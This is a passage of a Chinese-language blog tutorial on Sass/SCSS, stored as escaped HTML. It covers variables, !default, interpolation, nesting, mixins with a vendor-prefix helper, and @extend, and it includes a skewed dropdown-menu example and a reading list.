class=\"line\">  @<span class=\"keyword\">extend</span> %listStyle;<span class=\"comment\">//调用清除列表样式</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-class\">.menu</span> &gt; <span class=\"selector-tag\">li</span> &#123;</span><br><span class=\"line\">  <span class=\"attribute\">background</span>: <span class=\"variable\">$bgColor</span>;</span><br><span class=\"line\">  <span class=\"attribute\">float</span>: left;</span><br><span class=\"line\">  <span class=\"attribute\">position</span>: relative;    @<span class=\"keyword\">include</span> skewX(<span class=\"number\">25deg</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-class\">.menu</span> <span class=\"selector-tag\">a</span> &#123;</span><br><span class=\"line\">  <span class=\"attribute\">display</span>: block;</span><br><span class=\"line\">  @<span class=\"keyword\">extend</span> %typography;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-class\">.menu</span> <span class=\"selector-tag\">li</span>:hover &#123;</span><br><span class=\"line\">  <span class=\"attribute\">background</span>: <span class=\"variable\">$sfbgColor</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-class\">.menu</span> &gt; <span class=\"selector-tag\">li</span> &gt; <span class=\"selector-tag\">a</span> &#123;</span><br><span class=\"line\">  <span class=\"attribute\">padding</span>: <span class=\"number\">1em</span> <span class=\"number\">2em</span>;</span><br><span class=\"line\">  @<span class=\"keyword\">include</span> skewX(-<span class=\"number\">25deg</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/*Dropdown menu*/</span></span><br><span class=\"line\"><span class=\"selector-class\">.drop-menu</span> &#123;</span><br><span class=\"line\">  <span class=\"attribute\">position</span>: absolute;</span><br><span class=\"line\">  <span class=\"attribute\">width</span>: <span class=\"variable\">$width</span> / <span class=\"number\">4</span>;</span><br><span class=\"line\">  <span class=\"attribute\">left</span>: <span class=\"number\">50%</span>;</span><br><span class=\"line\">  <span class=\"attribute\">margin-left</span>: -(<span class=\"variable\">$width</span> / <span class=\"number\">8</span>);</span><br><span class=\"line\">  <span class=\"attribute\">opacity</span>: <span class=\"number\">0</span>;</span><br><span class=\"line\">  <span class=\"attribute\">visibility</span>: hidden;</span><br><span class=\"line\">  @<span class=\"keyword\">include</span> skewX(-<span class=\"number\">25deg</span>);</span><br><span class=\"line\">  @<span class=\"keyword\">include</span> transform-origin(left top);</span><br><span class=\"line\">  <span class=\"selector-tag\">li</span> &#123;</span><br><span class=\"line\">    <span class=\"attribute\">background-color</span>: <span class=\"variable\">$bgColor</span>;</span><br><span class=\"line\">    <span class=\"attribute\">position</span>: relative;</span><br><span class=\"line\">    <span class=\"attribute\">overflow</span>: hidden;</span><br><span class=\"line\">    <span class=\"attribute\">opacity</span>: <span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"attribute\">visibility</span>: hidden;</span><br><span class=\"line\">    @<span class=\"keyword\">include</span> transition(all .2s ease );</span><br><span class=\"line\">    <span class=\"selector-tag\">a</span> &#123;</span><br><span class=\"line\">      <span class=\"attribute\">padding</span>: <span class=\"number\">1em</span> <span class=\"number\">2em</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    &amp;::after &#123;</span><br><span class=\"line\">      <span class=\"attribute\">content</span>: <span class=\"string\">\"\"</span>;</span><br><span class=\"line\">      <span class=\"attribute\">position</span>: absolute;</span><br><span class=\"line\">      <span class=\"attribute\">top</span>: -<span class=\"number\">125%</span>;</span><br><span class=\"line\">      <span class=\"attribute\">height</span>: <span class=\"number\">100%</span>;</span><br><span class=\"line\">      <span class=\"attribute\">width</span>: <span class=\"number\">100%</span>;</span><br><span class=\"line\">      @<span class=\"keyword\">include</span> box-shadow(<span class=\"number\">0</span> 0 50px rgba(<span class=\"number\">0</span>,<span class=\"number\">0</span>,<span class=\"number\">0</span>,.<span class=\"number\">9</span>));</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    &amp;:nth-child(odd) &#123;</span><br><span class=\"line\">      @<span class=\"keyword\">include</span> transform(skewX(-<span class=\"number\">25deg</span>) translateX(<span class=\"number\">0</span>));</span><br><span class=\"line\">      <span class=\"selector-tag\">a</span> &#123;</span><br><span class=\"line\">        @<span class=\"keyword\">include</span> skewX(<span class=\"number\">25deg</span>);</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">      &amp;::after &#123;</span><br><span class=\"line\">        <span class=\"attribute\">right</span>: -<span class=\"number\">50%</span>;</span><br><span class=\"line\">        @<span class=\"keyword\">include</span> transform(skewX(-<span class=\"number\">25deg</span>) rotate(<span class=\"number\">3deg</span>));</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    &amp;:nth-child(even)&#123;</span><br><span class=\"line\">      @<span class=\"keyword\">include</span> transform(skewX(<span class=\"number\">25deg</span>) translateX(<span class=\"number\">0</span>));</span><br><span class=\"line\">      <span class=\"selector-tag\">a</span> &#123;</span><br><span class=\"line\">        @<span class=\"keyword\">include</span> skewX(-<span class=\"number\">25deg</span>);</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">      &amp;::after &#123;</span><br><span class=\"line\">        <span class=\"attribute\">left</span>: -<span class=\"number\">50%</span>;</span><br><span class=\"line\">        @<span class=\"keyword\">include</span> transform(skewX(<span class=\"number\">25deg</span>) rotate(<span class=\"number\">3deg</span>));</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-class\">.menu</span> &gt; <span class=\"selector-tag\">li</span>:hover <span class=\"selector-class\">.drop-menu</span>,</span><br><span class=\"line\"><span class=\"selector-class\">.menu</span> &gt; <span class=\"selector-tag\">li</span>:hover <span class=\"selector-class\">.drop-menu</span> <span class=\"selector-tag\">li</span> &#123;</span><br><span class=\"line\">  <span class=\"attribute\">opacity</span>: <span class=\"number\">1</span>;</span><br><span class=\"line\">  <span class=\"attribute\">visibility</span>: visible;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-class\">.menu</span> &gt; <span class=\"selector-tag\">li</span>:hover <span class=\"selector-class\">.drop-menu</span> <span class=\"selector-tag\">li</span>:nth-child(even)&#123;</span><br><span class=\"line\">  @<span class=\"keyword\">include</span> transform(skewX(<span class=\"number\">25deg</span>) translateX(<span class=\"number\">15px</span>));</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-class\">.menu</span> &gt; <span class=\"selector-tag\">li</span>:hover <span class=\"selector-class\">.drop-menu</span> <span class=\"selector-tag\">li</span>:nth-child(odd)&#123;</span><br><span class=\"line\">  @<span class=\"keyword\">include</span> transform(skewX(-<span class=\"number\">25deg</span>) translateX(-<span class=\"number\">15px</span>));</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"阅读\"><a href=\"#阅读\" class=\"headerlink\" title=\"阅读\"></a>阅读</h2><ul>\n<li><a href=\"https://www.sass.hk/\" target=\"_blank\" rel=\"noopener\">Sass中文网</a></li>\n<li><a href=\"https://www.w3cplus.com/preprocessor/sass-basic-syntax-and-features.html\" target=\"_blank\" rel=\"noopener\">SASS基础教程——SASS基本语法与特性</a></li>\n<li><a href=\"https://www.w3cplus.com/preprocessor/sass-basic-variable.html\" target=\"_blank\" rel=\"noopener\">sass揭秘之变量</a></li>\n<li><a href=\"https://www.w3cplus.com/preprocessor/sass-basic-mixins-nesting-placeholders-extend.html\" target=\"_blank\" rel=\"noopener\">理解SASS的嵌套，@extend，%Placeholders和Mixins</a></li>\n<li>在线编辑SCSS工具：<a href=\"https://www.sassmeister.com/\" target=\"_blank\" rel=\"noopener\">sassmeister</a></li>\n<li><a href=\"https://www.cnblogs.com/dingyufenglian/p/4864392.html\" target=\"_blank\" rel=\"noopener\">sass揭秘之@if，@for，@each（转载）</a></li>\n</ul>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"SASS\"><a href=\"#SASS\" class=\"headerlink\" title=\"SASS\"></a>SASS</h1><h2 id=\"什么是SASS\"><a href=\"#什么是SASS\" class=\"headerlink\" title=\"什么是SASS\"></a>什么是SASS</h2><p>​    SASS 是一种基于 CSS 的预处理语言，他在CSS的语法的基础上增加了变量(variables)\\嵌套(nested rules)、混合(mixins)、导入(inline import)等高级功能，这样在开发项目是便于管理整体项目的样式风格。</p>\n<h3 id=\"SASS的特征\"><a href=\"#SASS的特征\" class=\"headerlink\" title=\"SASS的特征\"></a>SASS的特征</h3><ul>\n<li>完全兼容 CSS3</li>\n<li>在 CSS 基础上增加变量、嵌套 (nesting)、混合 (mixins) 等功能</li>\n<li>通过函数进行颜色值与属性值的运算</li>\n<li>提供控制指令等高级功能</li>\n<li>自定义输出格式</li>\n</ul>\n<h3 id=\"SASS的语法格式\"><a href=\"#SASS的语法格式\" class=\"headerlink\" title=\"SASS的语法格式\"></a>SASS的语法格式</h3><p>SASS分为两种语法，一种是SCSS，另一种就是SASS。</p>\n<p>SCSS是最新的语法：</p>\n<ul>\n<li>扩展名为.scss</li>\n<li>SCSS语法规则和CSS的语法规则基本一样，使用大括号{}和分号;来分隔块的样式</li>\n<li>增强了对CSS3语法的支持</li>\n</ul>\n<p>SASS是老语法：</p>\n<ul>\n<li>扩展名为.sass</li>\n<li>SASS语法也称之为SASS的缩进语法，使用缩进和换行来分块，而不是使用分号来分隔语句，和stylus这种预处理语言类似</li>\n</ul>\n<p><strong>现在只学习scss语法</strong></p>\n<p>##SCSS语法</p>\n<h3 id=\"变量（Variables）\"><a href=\"#变量（Variables）\" class=\"headerlink\" title=\"变量（Variables）\"></a>变量（Variables）</h3><figure class=\"highlight scss\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"variable\">$color</span>: <span class=\"number\">#333</span>;  <span class=\"comment\">// 声明变量</span></span><br><span class=\"line\"><span class=\"variable\">$bgcolor</span>:<span class=\"number\">#f36</span>;</span><br><span class=\"line\"><span class=\"selector-tag\">body</span> &#123;</span><br><span class=\"line\">  <span class=\"attribute\">color</span>: <span class=\"variable\">$color</span>; <span class=\"comment\">// 引用变量</span></span><br><span class=\"line\">  <span class=\"attribute\">background-color</span>: <span class=\"variable\">$bgcolor</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h4 id=\"变量默认值-default\"><a href=\"#变量默认值-default\" class=\"headerlink\" title=\"变量默认值!default\"></a>变量默认值!default</h4><figure class=\"highlight scss\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"variable\">$color</span>:red;</span><br><span class=\"line\"><span class=\"variable\">$color</span>:blue !default;</span><br><span class=\"line\"><span class=\"selector-tag\">p</span>&#123;</span><br><span class=\"line\">    <span class=\"attribute\">color</span>:<span class=\"variable\">$color</span>; <span class=\"comment\">//red</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">// 假设变量申明带有!default，如果在此申明之前没有这个变量的申明，则用这个值，</span></span><br><span class=\"line\"><span class=\"comment\">// 反之如果之前有申明，则用申明的值。</span></span><br><span class=\"line\"><span class=\"comment\">// 当然如果你先!default申明，然后再申明一次，那就没什么意思了，这就是基本的变量覆盖，第一次申明的有无!default都一样。</span></span><br></pre></td></tr></table></figure>\n<h4 id=\"变量用-包裹\"><a href=\"#变量用-包裹\" class=\"headerlink\" title=\"变量用#{}包裹\"></a>变量用<code>#{}</code>包裹</h4><figure class=\"highlight scss\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"variable\">$btnClass</span>: btn !default;</span><br><span class=\"line\"><span class=\"variable\">$borderDirection</span>:  top !default;</span><br><span class=\"line\"></span><br><span class=\"line\">.#&#123;<span class=\"variable\">$btnClass</span>&#125;&#123;</span><br><span class=\"line\">    <span class=\"attribute\">border</span>-#&#123;<span class=\"variable\">$borderDirection</span>&#125;:<span class=\"number\">1px</span> solid <span class=\"number\">#ccc</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 解析成的css：</span></span><br><span class=\"line\"><span class=\"selector-class\">.btn</span>&#123;</span><br><span class=\"line\">    <span class=\"attribute\">border-top</span>:<span class=\"number\">1px</span> solid <span class=\"number\">#ccc</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h4 id=\"多个变量一起申明\"><a href=\"#多个变量一起申明\" class=\"headerlink\" title=\"多个变量一起申明\"></a>多个变量一起申明</h4><p>把多个相关的值写在一个变量里，然后通过<code>nth($var,index)</code>来获取第几个值。</p>\n<figure class=\"highlight scss\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"variable\">$linkColor</span>: red blue !default;</span><br><span class=\"line\"><span class=\"selector-tag\">a</span>&#123;</span><br><span class=\"line\">    <span class=\"attribute\">color</span>:nth(<span class=\"variable\">$linkColor</span>,<span class=\"number\">1</span>);</span><br><span class=\"line\">    &amp;:hover&#123;</span><br><span class=\"line\">        <span class=\"attribute\">color</span>:nth(<span class=\"variable\">$linkColor</span>,<span class=\"number\">2</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 解析成的css：</span></span><br><span class=\"line\"><span class=\"selector-tag\">a</span> &#123;</span><br><span class=\"line\">    <span class=\"attribute\">color</span>: red; </span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"selector-tag\">a</span>:hover &#123;</span><br><span class=\"line\">    <span class=\"attribute\">color</span>: blue; </span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"嵌套-Nesting\"><a href=\"#嵌套-Nesting\" class=\"headerlink\" title=\"嵌套(Nesting)\"></a>嵌套(Nesting)</h3><p>SASS中的嵌套有两种，一种是选择器的嵌套，另外一种是样式的嵌套。</p>\n<p>然而这两种嵌套的目的都是一样的，减少代码量，增强代码的可读性。</p>\n<h4 id=\"选择器的嵌套\"><a href=\"#选择器的嵌套\" class=\"headerlink\" title=\"选择器的嵌套\"></a>选择器的嵌套</h4><figure class=\"highlight scss\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"variable\">$color</span>: <span class=\"number\">#333</span>; </span><br><span class=\"line\"><span class=\"variable\">$bgcolor</span>:<span class=\"number\">#f36</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-tag\">section</span> &#123;</span><br><span class=\"line\">  <span class=\"attribute\">margin</span>: <span class=\"number\">10px</span>;</span><br><span class=\"line\">  <span class=\"attribute\">background-color</span>: <span class=\"number\">#f36</span>;</span><br><span class=\"line\">  <span class=\"selector-tag\">nav</span> &#123;</span><br><span class=\"line\">    <span class=\"attribute\">color</span>: <span class=\"variable\">$color</span>;</span><br><span class=\"line\">    <span class=\"attribute\">height</span>: <span class=\"number\">25px</span>;</span><br><span class=\"line\">    <span class=\"selector-tag\">a</span> &#123;</span><br><span class=\"line\">      <span class=\"attribute\">color</span>: <span class=\"number\">#0982c1</span>;</span><br><span class=\"line\">      &amp;:hover&#123;</span><br><span class=\"line\">        <span class=\"attribute\">text-decoration</span>: underline;</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h4 id=\"样式的嵌套\"><a href=\"#样式的嵌套\" class=\"headerlink\" title=\"样式的嵌套\"></a>样式的嵌套</h4><figure class=\"highlight scss\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"selector-tag\">li</span> &#123; </span><br><span class=\"line\">  <span class=\"attribute\">font</span>: &#123; </span><br><span class=\"line\">    style:italic; </span><br><span class=\"line\">    family:serif; </span><br><span class=\"line\">    weight:bold; </span><br><span class=\"line\">    size:<span class=\"number\">1.2em</span>; </span><br><span class=\"line\">  &#125; </span><br><span class=\"line\">&#125; </span><br><span class=\"line\"><span class=\"comment\">// 当然font属性可以使用css3的合写，那就更简单了</span></span><br><span class=\"line\"><span class=\"selector-tag\">li</span> &#123; </span><br><span class=\"line\">  <span class=\"attribute\">font</span>: serif italic bold <span class=\"number\">1.2em</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"Mixins\"><a href=\"#Mixins\" class=\"headerlink\" title=\"Mixins\"></a>Mixins</h3><p>Mixins是SASS中最强大的特性之一，简单点来说，Mixins可以将一部分样式抽出，作为单独定义的模块，被很多选择器重复使用。</p>\n<figure class=\"highlight scss\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">@<span class=\"keyword\">mixin</span> error(<span class=\"variable\">$borderWidth</span>: 2px)&#123;</span><br><span class=\"line\">  <span class=\"attribute\">border</span>: <span class=\"variable\">$borderWidth</span> solid <span class=\"number\">#f00</span>;</span><br><span class=\"line\">  <span class=\"attribute\">color</span>: <span class=\"number\">#f00</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-tag\">span</span> &#123;</span><br><span class=\"line\">  @<span class=\"keyword\">include</span> error(<span class=\"number\">10px</span>)</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>举例：</p>\n<figure class=\"highlight scss\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//Example: @include prefixer(border-radius, $radius, webkit spec);</span></span><br><span class=\"line\"><span class=\"comment\">//----------------------------------------</span></span><br><span class=\"line\"><span class=\"variable\">$prefix-for-webkit</span>: true !default;</span><br><span class=\"line\"><span class=\"variable\">$prefix-for-mozilla</span>: true !default;</span><br><span class=\"line\"><span class=\"variable\">$prefix-for-microsoft</span>: true !default;</span><br><span class=\"line\"><span class=\"variable\">$prefix-for-opera</span>: true !default;</span><br><span class=\"line\"><span class=\"variable\">$prefix-for-spec</span>: true !default; <span class=\"comment\">// required for keyframe mixin</span></span><br><span class=\"line\"><span class=\"comment\">//prefixer</span></span><br><span class=\"line\">@<span class=\"keyword\">mixin</span> prefixer (<span class=\"variable\">$property</span>, <span class=\"variable\">$value</span>, <span class=\"variable\">$prefixes</span>) &#123;</span><br><span class=\"line\">  @<span class=\"keyword\">each</span> <span class=\"variable\">$prefix</span> in <span class=\"variable\">$prefixes</span> &#123;</span><br><span class=\"line\">    @<span class=\"keyword\">if</span> <span class=\"variable\">$prefix</span> == webkit and <span class=\"variable\">$prefix-for-webkit</span> == true &#123;</span><br><span class=\"line\">      -webkit-#&#123;<span class=\"variable\">$property</span>&#125;: <span class=\"variable\">$value</span> <span class=\"meta\">!important</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    @<span class=\"keyword\">else</span> if <span class=\"variable\">$prefix</span> == moz and <span class=\"variable\">$prefix-for-mozilla</span> == true &#123;</span><br><span class=\"line\">      -moz-#&#123;<span class=\"variable\">$property</span>&#125;: <span class=\"variable\">$value</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    @<span class=\"keyword\">else</span> if <span class=\"variable\">$prefix</span> == ms and <span class=\"variable\">$prefix-for-microsoft</span> == true &#123;</span><br><span class=\"line\">      -ms-#&#123;<span class=\"variable\">$property</span>&#125;: <span class=\"variable\">$value</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    @<span class=\"keyword\">else</span> if <span class=\"variable\">$prefix</span> == o and <span class=\"variable\">$prefix-for-opera</span> == true &#123;</span><br><span class=\"line\">      -o-#&#123;<span class=\"variable\">$property</span>&#125;: <span class=\"variable\">$value</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    @<span class=\"keyword\">else</span> if <span class=\"variable\">$prefix</span> == spec and <span class=\"variable\">$prefix-for-spec</span> == true &#123;      #&#123;<span class=\"variable\">$property</span>&#125;: <span class=\"variable\">$value</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    @<span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">      @<span class=\"keyword\">warn</span> <span class=\"string\">\"Unrecognized prefix: #&#123;$prefix&#125;\"</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">@<span class=\"keyword\">mixin</span> skewX(<span class=\"variable\">$degrees</span>) &#123;</span><br><span class=\"line\">  @<span class=\"keyword\">include</span> prefixer(transform, skewX(<span class=\"variable\">$degrees</span>), webkit moz o ms spec);</span><br><span class=\"line\">  -webkit-<span class=\"attribute\">backface-visibility</span>: hidden;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"selector-tag\">p</span> &#123;</span><br><span class=\"line\">  @<span class=\"keyword\">include</span> skewX(<span class=\"number\">45deg</span>)</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>编译后：</p>\n<figure class=\"highlight css\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"selector-tag\">p</span> &#123;</span><br><span class=\"line\">  <span class=\"attribute\">-webkit-transform</span>: <span class=\"built_in\">skewX</span>(45deg) <span class=\"meta\">!important</span>;</span><br><span class=\"line\">  <span class=\"attribute\">-moz-transform</span>: <span class=\"built_in\">skewX</span>(45deg);</span><br><span class=\"line\">  <span class=\"attribute\">-o-transform</span>: <span class=\"built_in\">skewX</span>(45deg);</span><br><span class=\"line\">  <span class=\"attribute\">-ms-transform</span>: <span class=\"built_in\">skewX</span>(45deg);</span><br><span class=\"line\">  <span class=\"attribute\">transform</span>: <span class=\"built_in\">skewX</span>(45deg);</span><br><span class=\"line\">  <span class=\"attribute\">-webkit-backface-visibility</span>: hidden;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"extend\"><a href=\"#extend\" class=\"headerlink\" title=\"@extend\"></a>@extend</h3><p>假设现在要设计一个普通错误样式与一个严重错误样式，一般会这样写：</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">style</span>&gt;</span><span class=\"undefined\"></span></span><br><span class=\"line\"><span class=\"css\"><span class=\"selector-class\">.error</span> &#123;</span></span><br><span class=\"line\"><span class=\"css\">  <span class=\"selector-tag\">border</span>: 1<span class=\"selector-tag\">px</span> <span class=\"selector-id\">#f00</span>;</span></span><br><span class=\"line\"><span class=\"css\">  <span class=\"selector-tag\">background-color</span>: <span class=\"selector-id\">#fdd</span>;</span></span><br><span class=\"line\"><span class=\"undefined\">&#125;</span></span><br><span class=\"line\"><span class=\"css\"><span class=\"selector-class\">.seriousError</span> &#123;</span></span><br><span class=\"line\"><span class=\"undefined\">  border-width: 3px;</span></span><br><span class=\"line\"><span class=\"undefined\">&#125;</span></span><br><span class=\"line\"><span class=\"undefined\"></span><span class=\"tag\">&lt;/<span class=\"name\">style</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">class</span>=<span class=\"string\">\"error seriousError\"</span>&gt;</span></span><br><span class=\"line\">  Oh no! You've been hacked!</span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p>使用<code>@extend</code>：</p>\n<figure class=\"highlight scss\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"selector-class\">.error</span> &#123;</span><br><span class=\"line\">  <span class=\"attribute\">border</span>: <span class=\"number\">1px</span> <span class=\"number\">#f00</span>;</span><br><span class=\"line\">  <span class=\"attribute\">background-color</span>: <span class=\"number\">#fdd</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"selector-class\">.seriousError</span> &#123;</span><br><span class=\"line\">  @<span class=\"keyword\">extend</span> .error;</span><br><span class=\"line\">  <span class=\"attribute\">border-width</span>: <span class=\"number\">3px</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p><strong>注意@extendh会有一个缺点：</strong></p>\n<figure class=\"highlight scss\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"selector-class\">.error</span> &#123;</span><br><span class=\"line\">  <span class=\"attribute\">border</span>: <span class=\"number\">1px</span> <span class=\"number\">#f00</span>;</span><br><span class=\"line\">  <span class=\"attribute\">background-color</span>: <span class=\"number\">#fdd</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">// 这是一个其他样式</span></span><br><span class=\"line\"><span class=\"selector-tag\">p</span> <span class=\"selector-class\">.error</span> &#123;</span><br><span class=\"line\">  <span class=\"attribute\">color</span>: blue;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"selector-class\">.seriousError</span> &#123;</span><br><span class=\"line\">  @<span class=\"keyword\">extend</span> .error;</span><br><span class=\"line\">  <span class=\"attribute\">border-width</span>: <span class=\"number\">3px</span>;</span><br><span 